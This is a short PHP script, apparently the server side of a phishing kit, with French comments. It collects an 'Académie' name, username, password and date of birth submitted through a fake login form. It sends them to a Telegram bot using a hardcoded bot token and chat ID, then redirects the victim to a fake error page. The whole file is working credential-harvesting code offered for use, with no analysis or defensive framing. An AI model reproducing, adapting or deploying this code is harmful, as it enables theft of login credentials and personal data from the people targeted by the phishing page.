<?php

// CONFIGURATION
$telegram_bot_token = "7766381007:AAG16H_N_5z-K9Hgt4c7njwAYO4WYVxozko"; // Remplacez par votre token de bot Telegram
$chat_id = "1890838198"; // Remplacez par votre chat ID Telegram
$redirect_url = "./log-error.html"; // Remplacez par l'URL de redirection

// RÉCUPÉRATION DES DONNÉES DU FORMULAIRE
$acname = isset($_POST['acname']) ? $_POST['acname'] : '';
$user = isset($_POST['user']) ? $_POST['user'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$jour = isset($_POST['jour']) ? $_POST['jour'] : '';
$mois = isset($_POST['mois']) ? $_POST['mois'] : '';
$annee = isset($_POST['Année']) ? $_POST['Année'] : '';

// CRÉATION DU MESSAGE
$message = "📩 NOFORCING 2025:\n\n";
$message .= "🏫 Académie: $acname\n";
$message .= "👤 Identifiant: $user\n";
$message .= "🔑 Mot de passe: $pass\n";
$message .= "📅 Date de naissance: $jour/$mois/$annee\n";

// ENVOI À TELEGRAM
$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML'
];
$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($params),
    ]
];
$context = stream_context_create($options);
file_get_contents($telegram_url, false, $context);

// REDIRECTION
header("Location: $redirect_url");
exit();

?>
